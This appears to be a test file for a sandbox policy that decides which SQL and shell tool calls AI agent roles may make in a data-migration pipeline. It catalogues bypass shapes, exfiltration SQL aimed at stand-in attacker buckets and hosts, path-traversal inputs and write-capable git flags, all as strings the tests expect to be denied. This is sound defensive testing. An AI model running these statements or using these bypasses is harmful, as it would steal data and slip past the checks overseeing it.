const REVIEW_BYPASSES: [string, string, RegExp][] = [
  ["assignment with a block comment before :=",
    procedureOf(LET_SOURCE, "GL_LEDGER_SRC /* x */ := 'FINANCE.RAW.GL_LEDGER'", READ_SOURCE), /assign/],
  ["assignment with a line comment before :=",
    procedureOf(LET_SOURCE, "GL_LEDGER_SRC -- x\n  := 'FINANCE.RAW.GL_LEDGER'", READ_SOURCE), /assign/],
  ["assignment to a quoted name",
    procedureOf(LET_SOURCE, "\"GL_LEDGER_SRC\" := 'FINANCE.RAW.GL_LEDGER'", READ_SOURCE), /assign/],
  ["assignment glued to a comment before :=",
    procedureOf(LET_TARGET_ROW, "GL_SUMMARY_TGT/**/:= 'PROD.SALES.ORDERS'", OVERWRITE_TARGET), /assign/],
  ["a parameter re-assigned behind a comment before the LET",
    procedureOf("SRC_DB /**/ := 'FINANCE'", "SRC_SCHEMA /**/ := 'RAW'", LET_SOURCE, READ_SOURCE), /assign/],
  ["assignment inside IF",
    procedureOf(LET_SOURCE, "IF (TRUE) THEN GL_LEDGER_SRC := 'FINANCE.RAW.GL_LEDGER'", "END IF", READ_SOURCE), /\bIF\b/],
  ["the target re-pointed inside IF, then overwritten",
    procedureOf(LET_TARGET_ROW, "IF (TRUE) THEN GL_SUMMARY_TGT := 'PROD.SALES.ORDERS'", "END IF", OVERWRITE_TARGET), /\bIF\b/],
  ["a parameter re-assigned inside IF before the LET",
    procedureOf("IF (TRUE) THEN SRC_DB := 'FINANCE'", "END IF", LET_SOURCE, READ_SOURCE), /\bIF\b/],
  ["assignment inside a nested BEGIN",
    procedureOf(LET_SOURCE, "BEGIN GL_LEDGER_SRC := 'FINANCE.RAW.GL_LEDGER'", "END", READ_SOURCE), /BEGIN/],
  ["assignment inside FOR",
    procedureOf(LET_SOURCE, "FOR i IN 1 TO 1 DO GL_LEDGER_SRC := 'FINANCE.RAW.GL_LEDGER'", "END FOR", READ_SOURCE), /\bFOR\b/],
  ["assignment inside LOOP",
    procedureOf(LET_SOURCE, "LOOP GL_LEDGER_SRC := 'FINANCE.RAW.GL_LEDGER'", "BREAK", "END LOOP", READ_SOURCE), /LOOP/],
  ["assignment inside a CASE statement",
    procedureOf(LET_SOURCE, "CASE WHEN TRUE THEN GL_LEDGER_SRC := 'FINANCE.RAW.GL_LEDGER'", "END CASE", READ_SOURCE), /CASE/],
  ["assignment inside WHILE",
    procedureOf(LET_TARGET_ROW, "WHILE (FALSE) DO GL_SUMMARY_TGT := 'PROD.SALES.ORDERS'", "END WHILE", OVERWRITE_TARGET), /WHILE/],
  ["assignment inside REPEAT",
    procedureOf(LET_TARGET_ROW, "REPEAT GL_SUMMARY_TGT := 'PROD.SALES.ORDERS'", "UNTIL (TRUE) END REPEAT", OVERWRITE_TARGET), /REPEAT/],
  ["assignment in an EXCEPTION handler",
    procedureOf(LET_SOURCE, READ_SOURCE).replace(
      "  RETURN 'OK';\nEND;",
      () => "  RETURN 'OK';\nEXCEPTION WHEN OTHER THEN GL_LEDGER_SRC := 'FINANCE.RAW.GL_LEDGER';\nEND;",
    ), /EXCEPTION/],
  ["a shadowing LET inside a nested BEGIN",
    procedureOf(LET_SOURCE, "BEGIN LET GL_LEDGER_SRC VARCHAR := 'FINANCE.RAW.GL_LEDGER'", READ_SOURCE, "END"), /BEGIN/],
  ["a shadowing LET inside a nested BEGIN behind a comment",
    procedureOf(LET_SOURCE, "BEGIN -- inner\n  LET GL_LEDGER_SRC VARCHAR := 'FINANCE.RAW.GL_LEDGER'", READ_SOURCE, "END"), /BEGIN/],
  ["the target shadowed inside a nested BEGIN, then overwritten",
    procedureOf(LET_TARGET_ROW, "BEGIN\n  LET GL_SUMMARY_TGT VARCHAR := 'PROD.SALES.ORDERS'", OVERWRITE_TARGET, "END"), /BEGIN/],
  ["a shadowing LET without a type inside a nested BEGIN",
    procedureOf(LET_SOURCE, "BEGIN LET GL_LEDGER_SRC := 'FINANCE.RAW.GL_LEDGER'", READ_SOURCE, "END"), /BEGIN/],
  ["a shadowing LET inside IF",
    procedureOf(LET_SOURCE, "IF (TRUE) THEN LET GL_LEDGER_SRC VARCHAR := 'FINANCE.RAW.GL_LEDGER'", READ_SOURCE, "END IF"), /\bIF\b/],
  ["a name followed by DEFAULT (not a SQL statement)",
    procedureOf(LET_TARGET_ROW, "GL_SUMMARY_TGT DEFAULT 'PROD.SALES.ORDERS'", OVERWRITE_TARGET), /not a SQL statement/],
  ["a CALL inside the body",
    procedureOf(LET_SOURCE, "CALL MIG_WORK.WF0003_SEG_01('FINANCE','RAW','FINANCE','RAW','r1')", READ_SOURCE), /CALL/],
  ["a RETURN that reads another table",
    procedureOf(LET_SOURCE, READ_SOURCE).replace("  RETURN 'OK';", () => "  RETURN (SELECT COUNT(*) FROM FINANCE.RAW.GL_LEDGER);"),
    /RETURN/],
  ["a header whose parameters are reordered",
    procedureOf(LET_SOURCE, READ_SOURCE).replace(C4_PARAMETERS, "(A STRING, SRC_SCHEMA STRING, TGT_DB STRING, TGT_SCHEMA STRING, SRC_DB STRING)"),
    /parameters/],
  ["a header that moves SRC_DB into the RUN_ID slot",
    procedureOf(LET_SOURCE, READ_SOURCE).replace(C4_PARAMETERS, "(RUN_ID STRING, SRC_SCHEMA STRING, TGT_DB STRING, TGT_SCHEMA STRING, SRC_DB STRING)"),
    /parameters/],
  ["a header parameter with a DEFAULT",
    procedureOf(LET_SOURCE, READ_SOURCE).replace("SRC_DB STRING,", "SRC_DB STRING DEFAULT 'FINANCE',"), /parameters/],
];

test("C4V fix round 2: every re-binding and control-flow shape of the review's bypass table is denied", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  allow(sql(procedureOf(LET_SOURCE, LET_TARGET, READ_SOURCE, WRITE_TARGET)));
  for (const [shape, procedure, why] of REVIEW_BYPASSES) {
    const decision = sql(procedure);
    assert.equal(decision.permissionDecision, "deny", shape);
    assert.match((decision as { permissionDecisionReason: string }).permissionDecisionReason, why, shape);
  }
});

test("C4V fix round 2: a body is flat -- every Snowflake Scripting block or control keyword is denied by name", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  for (const keyword of ["BEGIN", "END", "IF", "ELSEIF", "ELSE", "CASE", "FOR", "WHILE", "REPEAT", "LOOP", "BREAK",
    "CONTINUE", "EXCEPTION", "DECLARE", "OPEN", "FETCH", "CLOSE", "RAISE", "AWAIT", "CANCEL", "NULL"]) {
    const decision = sql(procedureOf(LET_SOURCE, `${keyword} x`, READ_SOURCE));
    assert.equal(decision.permissionDecision, "deny", keyword);
    assert.match((decision as { permissionDecisionReason: string }).permissionDecisionReason, new RegExp(`\\b${keyword}\\b`), keyword);
  }
  // A lower-case keyword behind a comment is the same keyword.
  deny(sql(procedureOf(LET_SOURCE, "/* c */ begin null", "end", READ_SOURCE)), /BEGIN/);
});

test("C4V fix round 2: := or the word LET anywhere outside a rule-conforming LET is denied", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  deny(sql(procedureOf(LET_SOURCE, "INSERT INTO MIG_WORK.X SELECT 1 AS LET", READ_SOURCE)), /LET/);
  deny(sql(procedureOf(LET_SOURCE, "SELECT 1 FROM MIG_WORK.X WHERE 1 := 1", READ_SOURCE)), /assign/);
  // …while the same words inside a string literal or a comment are only data.
  allow(sql(procedureOf(LET_SOURCE, "CREATE OR REPLACE TABLE MIG_WORK.T AS SELECT 'a; LET X VARCHAR := 1' AS C", READ_SOURCE)));
  allow(sql(procedureOf("-- LET X := 1 is how a table name is NOT built\n  " + LET_SOURCE, READ_SOURCE)));
});

test("C4V fix round 2: only RETURN '<string literal>' is accepted in a body", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  const withReturn = (ret: string) => procedureOf(LET_SOURCE, READ_SOURCE).replace("  RETURN 'OK';", () => `  ${ret};`);
  allow(sql(withReturn("RETURN 'done'")));
  allow(sql(withReturn("RETURN 'it''s done' /* a comment after it */")));
  deny(sql(withReturn("RETURN 'OK' || RUN_ID")), /RETURN/);
  deny(sql(withReturn("RETURN (SELECT COUNT(*) FROM MIG_WORK.WF0003_SEG_02_OUT)")), /RETURN/);
  deny(sql(withReturn("RETURN GL_LEDGER_SRC")), /RETURN/);
});

test("C4V fix round 2: the header is exactly contract C4's, and a top-level CALL keeps its signature check", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  allow(sql(procedureOf(LET_SOURCE, READ_SOURCE).replace(C4_PARAMETERS, C4_PARAMETERS.toLowerCase())));
  deny(sql(procedureOf(LET_SOURCE, READ_SOURCE).replace(C4_PARAMETERS, C4_PARAMETERS.replaceAll("STRING", "VARCHAR"))), /parameters/);
  deny(sql(procedureOf(LET_SOURCE, READ_SOURCE).replace(C4_PARAMETERS, "(SRC_DB STRING, SRC_SCHEMA STRING, TGT_DB STRING, TGT_SCHEMA STRING)")), /parameters/);
  deny(sql(procedureOf(LET_SOURCE, READ_SOURCE).replace(C4_PARAMETERS, "(SRC_DB STRING, SRC_SCHEMA STRING, TGT_DB STRING, TGT_SCHEMA STRING, RUN_ID STRING, EXTRA STRING)")), /parameters/);
  // With the header fixed, the five CALL arguments mean SRC_DB, SRC_SCHEMA, TGT_DB, TGT_SCHEMA, RUN_ID;
  // RUN_ID is only a label, so any literal there is harmless.
  allow(sql("CALL MIG_WORK.WF0003_SEG_02('MIGDB','MIG_GOLDEN_WF0003_NORMAL','MIGDB','MIG_WORK','FINANCE')"));
  deny(sql("CALL MIG_WORK.WF0003_SEG_02('FINANCE','MIG_GOLDEN_WF0003_NORMAL','MIGDB','MIG_WORK','r1')"), /SRC_DB/);
});

test("C4V fix round 2: a quote the judge misreads cannot hide a statement from it", () => {
  // Snowflake reads \' inside a string as an escaped quote and "x'" as an identifier. A judge that
  // read either as the end or the start of a string would take the next statement for string text.
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  deny(sql(procedureOf(LET_TARGET_ROW, String.raw`SELECT 'x\' AS a, '; GL_SUMMARY_TGT := 'PROD.SALES.ORDERS'; SELECT 'y'`, OVERWRITE_TARGET)), /assign/);
  deny(sql(procedureOf(LET_TARGET_ROW, "SELECT 1 AS \"x'\"; GL_SUMMARY_TGT := 'PROD.SALES.ORDERS'; SELECT 'y'", OVERWRITE_TARGET)), /assign/);
  allow(sql(procedureOf(LET_SOURCE, String.raw`CREATE OR REPLACE TABLE MIG_WORK."A--B'C" AS SELECT 'it\'s' AS C`, READ_SOURCE)));
});

// --- Task C4V fix round 3 (1): no statement may move data between the sandbox and an external
// location. Every shape below was ALLOWED at base 39120ae and at a8ee12f (the task re-review's
// probe_exfil.ts, extended to the ruling's list). The primary boundary is still the Snowflake role;
// this is the policy's own line.

const EXTERNAL_LOCATIONS: [string, string][] = [
  ["COPY INTO an external URL with credentials",
    "COPY INTO 's3://attacker-bucket/exfil/' FROM MIG_WORK.SOME_TABLE CREDENTIALS=(AWS_KEY_ID='x' AWS_SECRET_KEY='y') FILE_FORMAT=(TYPE=CSV)"],
  ["COPY INTO an external URL through a storage integration",
    "COPY INTO 'azure://attacker.blob.core.windows.net/exfil/' FROM MIG_WORK.SOME_TABLE STORAGE_INTEGRATION = SOME_INTEGRATION"],
  ["COPY INTO an external URL, nothing else",
    "COPY INTO 'gcs://attacker-bucket/exfil/' FROM (SELECT * FROM MIG_WORK.SOME_TABLE)"],
  ["COPY INTO a sandbox table FROM an external URL",
    "COPY INTO MIG_WORK.SOME_TABLE FROM 's3://attacker-bucket/payload/'"],
  ["CREATE STAGE under a sandbox name with an external URL and credentials",
    "CREATE OR REPLACE STAGE MIG_WORK.MYSTAGE URL='s3://attacker-bucket/exfil/' CREDENTIALS=(AWS_KEY_ID='x' AWS_SECRET_KEY='y')"],
  ["CREATE STAGE with an external URL only",
    "CREATE OR REPLACE STAGE MIG_WORK.MYSTAGE2 URL='azure://attacker.blob.core.windows.net/exfil/'"],
  ["CREATE STAGE with a storage integration",
    "CREATE STAGE MIG_WORK.MYSTAGE3 STORAGE_INTEGRATION = SOME_INTEGRATION URL = 's3://attacker-bucket/'"],
  ["CREATE STAGE with ENCRYPTION",
    "CREATE STAGE MIG_WORK.MYSTAGE4 ENCRYPTION = (TYPE = 'AWS_SSE_KMS' KMS_KEY_ID = 'k')"],
  ["ALTER STAGE to an external URL",
    "ALTER STAGE MIG_WORK.MYSTAGE SET URL = 's3://attacker-bucket/exfil/'"],
  ["CREATE STORAGE INTEGRATION",
    "CREATE STORAGE INTEGRATION X TYPE = EXTERNAL_STAGE STORAGE_PROVIDER = 'S3' ENABLED = TRUE STORAGE_AWS_ROLE_ARN = 'arn' STORAGE_ALLOWED_LOCATIONS = ('s3://b/')"],
  ["CREATE EXTERNAL FUNCTION",
    "CREATE OR REPLACE EXTERNAL FUNCTION MIG_WORK.F(X NUMBER) RETURNS VARIANT API_INTEGRATION = I AS 'https://attacker.example/x'"],
  ["CREATE API INTEGRATION",
    "CREATE API INTEGRATION I API_PROVIDER = AWS_API_GATEWAY API_AWS_ROLE_ARN = 'arn' API_ALLOWED_PREFIXES = ('https://x') ENABLED = TRUE"],
  ["CREATE NETWORK RULE",
    "CREATE NETWORK RULE MIG_WORK.R MODE = EGRESS TYPE = HOST_PORT VALUE_LIST = ('attacker.example')"],
  ["CREATE EXTERNAL ACCESS INTEGRATION",
    "CREATE EXTERNAL ACCESS INTEGRATION I ALLOWED_NETWORK_RULES = (MIG_WORK.R) ENABLED = TRUE"],
  ["GET from a sandbox stage to a local file", "GET @MIG_WORK.S file:///tmp/"],
  ["PUT a local file into a sandbox stage", "PUT file:///tmp/x.csv @MIG_WORK.S"],
  ["LIST an external location", "LIST 's3://attacker-bucket/'"],
  ["REMOVE from an external location", "REMOVE 's3://attacker-bucket/x'"],
  ["a statement that mentions CREDENTIALS=", "COPY INTO MIG_WORK.T FROM @MIG_WORK.S CREDENTIALS = (AWS_ROLE = 'r')"],
  ["a statement that mentions AWS_KEY_ID", "SELECT AWS_KEY_ID FROM MIG_WORK.T"],
  ["a statement that mentions AZURE_SAS_TOKEN", "SELECT AZURE_SAS_TOKEN FROM MIG_WORK.T"],
  ["a statement that mentions PRIVATE_KEY", "SELECT PRIVATE_KEY FROM MIG_WORK.T"],
];

test("C4V fix round 3: every move of data to or from an external location is denied", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  for (const [shape, statement] of EXTERNAL_LOCATIONS) {
    const decision = sql(statement);
    assert.equal(decision.permissionDecision, "deny", shape);
    assert.match((decision as { permissionDecisionReason: string }).permissionDecisionReason,
      /^external-location: .* may not move data outside the sandbox/, shape);
  }
  // …inside a procedure body too, and for intake's catalog reads.
  deny(sql(procedureOf(LET_SOURCE, "COPY INTO 's3://attacker-bucket/exfil/' FROM (SELECT * FROM IDENTIFIER(:GL_LEDGER_SRC))")), /external-location/);
  deny(decide("intake", "wf_0003", "snowflake_query", { sql: "SELECT AWS_KEY_ID FROM INFORMATION_SCHEMA.COLUMNS" }), /external-location/);
});

test("C4V fix round 3: internal named stages under a sandbox schema stay allowed", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  allow(sql("COPY INTO @MIG_WORK.STAGE FROM MIG_WORK.SOME_TABLE"));
  allow(sql("COPY INTO MIG_WORK.SOME_TABLE FROM @MIG_WORK.STAGE FILES = ('a.csv') FILE_FORMAT = (TYPE = CSV)"));
  allow(sql("CREATE OR REPLACE STAGE MIG_WORK.STAGE"));
  allow(sql("LIST @MIG_WORK.STAGE"));
  // A word in a string literal or a comment is data, not a location or a credential.
  allow(sql("SELECT 'CREDENTIALS= is not a credential' AS NOTE FROM MIG_WORK.T -- nor is AWS_KEY_ID here"));
});

// --- Task C4V fix round 3 (2): a <LOGICAL>_SRC name is only read and a <LOGICAL>_TGT name only
// written, as compile_check's c4:identifier_role holds them.

test("C4V fix round 3: a _SRC name is never written and a _TGT name never read", () => {
  const sql = (statement: string) => decide("validator", "wf_0003", "snowflake_query", { sql: statement });
  allow(sql(VALIDATOR_PROCEDURE));
  allow(sql(procedureOf(LET_TARGET, "DELETE FROM IDENTIFIER(:GL_SUMMARY_TGT) WHERE ACCT IS NULL",
    "UPDATE IDENTIFIER(:GL_SUMMARY_TGT) SET ACCT = 1 WHERE ACCT IS NULL")));
  for (const [shape, statement] of [
    ["CREATE … AS into a _SRC", "CREATE OR REPLACE TABLE IDENTIFIER(:GL_LEDGER_SRC) AS SELECT 1 AS X"],
    ["INSERT INTO a _SRC", "INSERT INTO IDENTIFIER(:GL_LEDGER_SRC) SELECT ACCT FROM MIG_WORK.WF0003_SEG_02_OUT"],
    ["MERGE INTO a _SRC", "MERGE INTO IDENTIFIER(:GL_LEDGER_SRC) t USING MIG_WORK.WF0003_SEG_02_OUT s ON t.ACCT = s.ACCT WHEN MATCHED THEN DELETE"],
    ["UPDATE a _SRC", "UPDATE IDENTIFIER(:GL_LEDGER_SRC) SET ACCT = 1"],
    ["DELETE FROM a _SRC", "DELETE FROM IDENTIFIER(:GL_LEDGER_SRC) WHERE ACCT = 1"],
    ["TRUNCATE a _SRC", "TRUNCATE TABLE IDENTIFIER(:GL_LEDGER_SRC)"],
  ]) {
    const decision = sql(procedureOf(LET_SOURCE, statement));
    assert.equal(decision.permissionDecision, "deny", shape);
    if (shape !== "TRUNCATE a _SRC") { // TRUNCATE is destructive, denied for that reason first
      assert.match((decision as { permissionDecisionReason: string }).permissionDecisionReason, /_SRC.*only ever read/, shape);
    }
  }
  for (const [shape, statement] of [
    ["SELECT FROM a _TGT", "CREATE OR REPLACE TABLE MIG_WORK.WF0003_SEG_02_OUT AS SELECT ACCT FROM IDENTIFIER(:GL_SUMMARY_TGT)"],
    ["JOIN a _TGT", "CREATE OR REPLACE TABLE MIG_WORK.WF0003_SEG_02_OUT AS SELECT a.ACCT FROM MIG_WORK.X a JOIN IDENTIFIER(:GL_SUMMARY_TGT) b ON a.ACCT = b.ACCT"],
    ["MERGE … USING a _TGT", "MERGE INTO MIG_WORK.WF0003_SEG_02_OUT t USING IDENTIFIER(:GL_SUMMARY_TGT) s ON t.ACCT = s.ACCT WHEN MATCHED THEN DELETE"],
  ]) {
    deny(sql(procedureOf(LET_TARGET, statement)), /_TGT.*only ever written/);
  }
});

test("ruling B5: a CALL must match the contract signature and name MIG_ schemas", () => {
  const sql = (statement: string) => decide("validator", "wf_0001", "snowflake_query", { sql: statement });
  allow(sql("CALL MIG_WORK.WF0001_SEG_01('MIGDB','MIG_GOLDEN_WF0001_NORMAL','MIGDB','MIG_WORK','r1')"));
  deny(sql("CALL MIG_WORK.WF0001_SEG_01('MIGDB','RAW','MIGDB','CURATED','r1')"), /MIG_ schema/);
  deny(sql("CALL MIG_WORK.WF0001_SEG_01('MIGDB','RAW','ANALYTICS','CURATED','r1')"), /MIG_ schema|sandbox database/);
  deny(sql("CALL MIG_WORK.P('x')"), /contract signature/);
  deny(sql("CALL MIG_WORK.P()"), /contract signature/);
});

test("ruling B6: intake may alias the catalog, in a sandbox database", () => {
  const intake = (sql: string) => decide("intake", "wf_0001", "snowflake_query", { sql });
  allow(intake("SELECT c.COLUMN_NAME FROM MIGDB.INFORMATION_SCHEMA.COLUMNS c"));
  allow(intake("select table_name from information_schema.tables"));
  allow(intake("SELECT COLUMN_NAME FROM MIG_WORK.CATALOG_COLUMNS"));
  deny(intake("SELECT c.COLUMN_NAME FROM ANALYTICS.INFORMATION_SCHEMA.COLUMNS c"), /database/);
  deny(intake("SELECT c.X FROM ANALYTICS.RAW.COLUMNS c"), /INFORMATION_SCHEMA/);
});

// --- fix round 2: the re-reviewer's findings ---

test("CRITICAL: a listing command cannot write through one of its own flags", () => {
  deny(decide("documenter", "wf_0001", "bash", { command: "git diff --output=golden/outputs/normal/x.csv" }), /flag not allowed/);
  deny(decide("reviewer", "wf_0001", "bash", { command: "git diff --output=.github/agents/evil.md" }), /flag not allowed/);
  deny(decide("documenter", "wf_0001", "bash", { command: "git diff --output=orchestrator/policy.ts" }), /flag not allowed/);
  deny(decide("documenter", "wf_0001", "bash", { command: "git diff --output=scripts/parse.py" }), /flag not allowed/);
  deny(decide("documenter", "wf_0001", "bash", { command: "git diff --output golden/outputs/normal/1.csv" }), /flag not allowed/);
});

test("listing flags are an allow-list, and the dangerous ones are named", () => {
  for (const flag of [
    "--output", "-o", "-O", "--ext-diff", "--textconv", "--no-index", "-c", "-C",
    "--git-dir", "--work-tree", "--exec-path", "--upload-pack", "--open-files-in-pager",
  ]) {
    deny(decide("documenter", "wf_0001", "bash", { command: `git diff ${flag}` }), /flag not allowed|interpreter flag/);
    deny(decide("validator", "wf_0001", "bash", { command: `git log ${flag}` }), /flag not allowed|interpreter flag/);
  }
  deny(decide("fixer", "wf_0001", "pwsh", { command: "Get-Content -Stream evil workflows/wf_0001/manifest.json" }, "seg_01"), /flag not allowed/);
  deny(decide("fixer", "wf_0001", "pwsh", { command: "Get-Content -Wait workflows/wf_0001/manifest.json" }, "seg_01"), /flag not allowed/);
  deny(decide("analyzer", "wf_0001", "bash", { command: "cat -A workflows/wf_0001/manifest.json" }), /flag not allowed/);
  deny(decide("analyzer", "wf_0001", "bash", { command: "ls --color=always" }), /flag not allowed/);
  deny(decide("analyzer", "wf_0001", "bash", { command: "git log -n abc" }), /number/);
  deny(decide("analyzer", "wf_0001", "bash", { command: "git checkout main" }), /git|may not run/);
  deny(decide("analyzer", "wf_0001", "bash", { command: "git config user.email x" }), /git|may not run/);
});

test("every listing command still works with its own flags", () => {
  allow(decide("analyzer", "wf_0001", "bash", { command: "ls -la workflows/wf_0001" }));
  allow(decide("analyzer", "wf_0001", "cmd", { command: "dir /b workflows/wf_0001" }));
  allow(decide("analyzer", "wf_0001", "bash", { command: "cat workflows/wf_0001/manifest.json" }));
  allow(decide("analyzer", "wf_0001", "cmd", { command: "type workflows/wf_0001/manifest.json" }));
  allow(decide("fixer", "wf_0001", "pwsh", { command: "Get-Content -Path workflows/wf_0001/manifest.json -TotalCount 20" }, "seg_01"));
  allow(decide("fixer", "wf_0001", "pwsh", { command: "Get-ChildItem -Path workflows/wf_0001 -Recurse -Depth 2" }, "seg_01"));
  allow(decide("documenter", "wf_0001", "bash", { command: "git status --porcelain" }));
  allow(decide("documenter", "wf_0001", "bash", { command: "git diff --stat" }));
  allow(decide("documenter", "wf_0001", "bash", { command: "git log --oneline -n 5" }));
  allow(decide("documenter", "wf_0001", "bash", { command: "git log -5 --no-color" }));
});

test("listing arguments are still paths in this workflow", () => {
  deny(decide("documenter", "wf_0001", "bash", { command: "git diff -- workflows/wf_0002/segments/seg_01/proc.sql" }), /other workflows/);
  deny(decide("analyzer", "wf_0001", "bash", { command: "cat workflows/wf_0002/manifest.json" }), /other workflows/);
  deny(decide("fixer", "wf_0001", "pwsh", { command: "Get-Content workflows/wf_0002/manifest.json" }, "seg_01"), /other workflows/);
  deny(decide("analyzer", "wf_0001", "bash", { command: "cat ../../../etc/passwd" }), /escapes|argument/);
  deny(decide("analyzer", "wf_0001", "cmd", { command: "type workflows\\wf_0001\\..\\..\\.github\\agents\\evil.md" }), /argument|escapes/);
  allow(decide("documenter", "wf_0001", "bash", { command: "git diff -- workflows/wf_0001/docs/migration.md" }));
  allow(decide("fixer", "wf_0001", "pwsh", { command: "Get-Content workflows\\wf_0001\\manifest.json" }, "seg_01"));
});

test("IMPORTANT A: arguments nested deeper than the walker are denied, not dropped", () => {
  deny(
    decide("intake", "wf_0001", "edit", {
      path: "workflows/wf_0001/intake/plan.md",
      L1: { L2: { L3: { L4: { L5: { L6: { path: ".github/agents/evil.md" } } } } } },
    }),
    /too deeply nested/,
  );
  allow(decide("intake", "wf_0001", "edit", { edits: [{ path: "workflows/wf_0001/intake/plan.md" }] }));
});

test("IMPORTANT B: a three-part name is judged on its database too", () => {
  const sql = (statement: string) => decide("validator", "wf_0001", "snowflake_query", { sql: statement });
  deny(sql("SELECT * FROM FINANCE.MIG_WORK.GL_LEDGER"), /database/);
  deny(sql("CREATE OR REPLACE TABLE ANALYTICS.MIG_WORK.X AS SELECT 1"), /database/);
  allow(sql("SELECT * FROM MIGDB.MIG_WORK.T"));
  allow(sql("SELECT * FROM MIG_WORK.T"));
  allow(decide("validator", "wf_0001", "snowflake_query", { sql: "SELECT * FROM ALTDB.MIG_WORK.T" }, undefined, undefined, { sandboxDatabases: ["MIGDB", "ALTDB"] }));
  deny(decide("validator", "wf_0001", "snowflake_query", { sql: "SELECT * FROM MIGDB.MIG_WORK.T" }, undefined, undefined, { sandboxDatabases: ["ALTDB"] }), /database/);
});

test("IMPORTANT B: a CALL names sandbox databases as well as MIG_ schemas", () => {
  const sql = (statement: string) => decide("validator", "wf_0001", "snowflake_query", { sql: statement });
  allow(sql("CALL MIG_WORK.WF0001_SEG_01('MIGDB','MIG_GOLDEN_WF0001_NORMAL','MIGDB','MIG_WORK','r1')"));
  deny(sql("CALL MIG_WORK.WF0001_SEG_01('ANALYTICS','MIG_GOLDEN_WF0001_NORMAL','MIGDB','MIG_WORK','r1')"), /SRC_DB/);
  deny(sql("CALL MIG_WORK.WF0001_SEG_01('MIGDB','MIG_GOLDEN_WF0001_NORMAL','ANALYTICS','MIG_WORK','r1')"), /TGT_DB/);
});

test("hostile inputs are denied for every role", () => {
  const prefixes = [
    "workflows/wf_0001/intake/../../../",
    "workflows\\wf_0001\\segments\\seg_01\\..\\..\\..\\..\\",
    "mappings/../",
    "workflows/wf_0001/docs/../../../",
    "./scripts/parsers/ext/../../../",
    "tests/parser_corpus/../../",
  ];
  const targets = [
    ".github/agents/evil.md",
    "cookbook/hacked.md",
    "scripts/parse.py",
    "golden/outputs/normal/1.csv",
    "orchestrator/policy.ts",
    ".git/config",
  ];
  const roles = ["intake", "analyzer", "translator", "reviewer", "validator", "fixer", "parser-recovery", "documenter"] as const;
  let checked = 0;
  for (const role of roles) {
    for (const prefix of prefixes) {
      for (const target of targets) {
        const d = decide(role, "wf_0001", "edit", { path: `${prefix}${target}` }, "seg_01", ROOT);
        assert.equal(d.permissionDecision, "deny", `${role} ${prefix}${target}`);
        checked += 1;
      }
    }
  }
  assert.equal(checked, roles.length * prefixes.length * targets.length);
});

test("hostile listing flags are denied for every role and every listing command", () => {
  const listings = ["ls", "dir", "cat", "type", "Get-Content", "Get-ChildItem", "git status", "git diff", "git log"];
  const injections = [
    "--output=golden/outputs/normal/1.csv",
    "--output .github/agents/evil.md",
    "-o orchestrator/policy.ts",
    "--git-dir=/other/repo",
    "--exec-path=/tmp",
    "--textconv",
  ];
  const roles = ["intake", "analyzer", "translator", "reviewer", "validator", "fixer", "parser-recovery", "documenter"] as const;
  let checked = 0;
  for (const role of roles) {
    for (const listing of listings) {
      for (const injection of injections) {
        const d = decide(role, "wf_0001", "bash", { command: `${listing} ${injection}` }, "seg_01", ROOT);
        assert.equal(d.permissionDecision, "deny", `${role}: ${listing} ${injection}`);
        checked += 1;
      }
    }
  }
  assert.equal(checked, roles.length * listings.length * injections.length);
});

// --- Task 16: live BYOK smoke test (CopilotRunner against a real llama.cpp session, wf_0001,
// role intake) --- Every real `toolName` and argument shape the SDK reported across two live
// attempts (`view`, `glob`, `grep`, `powershell`, `task`) was already covered by the existing
// classification (READ_TOOLS or the SHELL_TOOL regex): zero `unrecognized-tool` audit events in
// either attempt. No SQL_TOOL or WRITE_TOOL call was ever attempted (both attempts crashed during
// intake's read-only orientation phase, before writing anything), so those two regexes remain
// unverified by live evidence. Per the coordinator's addendum, a policy that already judges live
// evidence correctly gets regression tests, not a rule change: these lock in the exact real
// command/argument shapes observed, byte for byte, from workflows/wf_0001/audit.jsonl.
// See docs/live-smoke-test.md and task-16-report.md for the full run.

test("Task 16 live evidence: a real shell-tool call carries an extra description key the policy ignores", () => {
  // Real audit line: {"tool":"powershell","args":"{\"command\":\"git status\",\"description\":\"Show git repo status\"}","decision":"allow"}
  allow(decide("intake", "wf_0001", "powershell", { command: "git status", description: "Show git repo status" }));
});

test("Task 16 live evidence: git's own global flags are not a listing subcommand — denied, as observed live", () => {
  // Real audit lines: "git --no-pager log --oneline -5" and "git --no-pager status --short" were
  // both denied, because GIT_SUBCOMMANDS is matched at the position right after "git" and
  // "--no-pager" occupies it. This is intentional fail-closed behaviour (a plain "git log"/"git
  // status" — also observed live, seconds later — works fine); recorded, not loosened.
  deny(decide("intake", "wf_0001", "powershell", { command: "git --no-pager log --oneline -5" }), /git --no-pager is not a listing command/);
  deny(decide("intake", "wf_0001", "powershell", { command: "git --no-pager status --short" }), /git --no-pager is not a listing command/);
  allow(decide("intake", "wf_0001", "powershell", { command: "git log --oneline -5" }));
  allow(decide("intake", "wf_0001", "powershell", { command: "git status --short" }));
});

test("Task 16 live evidence: a bare '.' listing argument is denied, as observed live (known limitation, not fixed)", () => {
  // Real audit line: "Get-ChildItem -Name ." denied ("listing argument not allowed: ."). "." fails
  // the plain-argument charset (LISTING_ARG_TOKEN requires an alnum/underscore first character).
  // This is a real friction point for the model (see task-16-report.md) but not a security hole —
  // denying is safe — so per the addendum it is recorded here, not relaxed.
  deny(decide("intake", "wf_0001", "powershell", { command: "Get-ChildItem -Name ." }), /listing argument not allowed/);
});

test("Task 16 live evidence: get-childitem's own -File flag can never be used — INTERPRETER_FLAGS shadows it (internal inconsistency, not fixed)", () => {
  // Real audit line: "Get-ChildItem -Path . -Recurse -File" (no metacharacter, no traversal) was
  // still denied — but NOT for its listing shape. `READ_ONLY_SHELL`'s "get-childitem" entry
  // explicitly lists "-file" among its own allowed flags (to mean "files only, not directories"),
  // but `decideShell` checks the whole command against `INTERPRETER_FLAGS` (which also contains
